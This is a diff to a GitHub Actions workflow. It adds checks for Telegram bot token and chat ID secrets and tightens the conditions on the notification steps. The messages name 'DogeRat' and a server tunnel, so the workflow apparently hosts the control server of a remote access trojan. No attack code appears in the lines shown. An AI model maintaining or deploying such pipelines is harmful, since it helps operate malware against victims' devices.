@@ -70,6 +70,43 @@ jobs:
             fi
           fi
 
+      # NEW STEP: Check Telegram Configuration
+      - name: Check Telegram Configuration
+        run: |
+          BOT_TOKEN="${{ env.TELEGRAM_BOT_TOKEN }}"
+          CHAT_ID="${{ env.TELEGRAM_CHAT_ID }}"
+          
+          # Case 1: Both are missing
+          if [ -z "$BOT_TOKEN" ] && [ -z "$CHAT_ID" ]; then
+            MSG="⚠️ Configuration Incomplete: Please paste your **TELEGRAM_BOT_TOKEN** and **TELEGRAM_CHAT_ID** in repository secrets."
+            echo "$MSG" >> $GITHUB_STEP_SUMMARY
+            echo "::warning::$MSG"
+            echo "STATUS=INCOMPLETE" >> $GITHUB_ENV
+            exit 0
+          fi
+          
+          # Case 2: Only Token is missing
+          if [ -z "$BOT_TOKEN" ]; then
+            MSG="⚠️ Missing Token: Please paste your **TELEGRAM_BOT_TOKEN** in repository secrets."
+            echo "$MSG" >> $GITHUB_STEP_SUMMARY
+            echo "::warning::$MSG"
+            echo "STATUS=INCOMPLETE" >> $GITHUB_ENV
+            exit 0
+          fi
+          
+          # Case 3: Only Chat ID is missing
+          if [ -z "$CHAT_ID" ]; then
+            MSG="⚠️ Missing Chat ID: Please paste your **TELEGRAM_CHAT_ID** in repository secrets."
+            echo "$MSG" >> $GITHUB_STEP_SUMMARY
+            echo "::warning::$MSG"
+            echo "STATUS=INCOMPLETE" >> $GITHUB_ENV
+            exit 0
+          fi
+          
+          # Case 4: All good
+          echo "✅ Telegram credentials found." >> $GITHUB_STEP_SUMMARY
+          echo "STATUS=READY" >> $GITHUB_ENV
+
       - name: Get version from build.gradle
         id: version
         run: |
@@ -286,7 +323,8 @@ jobs:
           if-no-files-found: error
 
       - name: Send Telegram notification
-        if: env.TELEGRAM_CHAT_ID != ''
+        # Only run if Chat ID is present (Bot token check handles itself in the script usually, but we check both to be safe)
+        if: env.TELEGRAM_CHAT_ID != '' && env.TELEGRAM_BOT_TOKEN != ''
         run: |
           VERSION="${{ steps.version.outputs.version_name }}"
           TUNNEL_URL="${{ steps.tunnel.outputs.tunnel_url }}"
@@ -354,7 +392,7 @@ jobs:
           echo "=========================================="
 
       - name: Send end notification
-        if: env.TELEGRAM_CHAT_ID != ''
+        if: env.TELEGRAM_CHAT_ID != '' && env.TELEGRAM_BOT_TOKEN != ''
         run: |
           VERSION="${{ steps.version.outputs.version_name }}"
           MESSAGE="⏰ *DogeRat v${VERSION} Session Ended*%0AThe server tunnel has been closed. Re-run the workflow to continue."
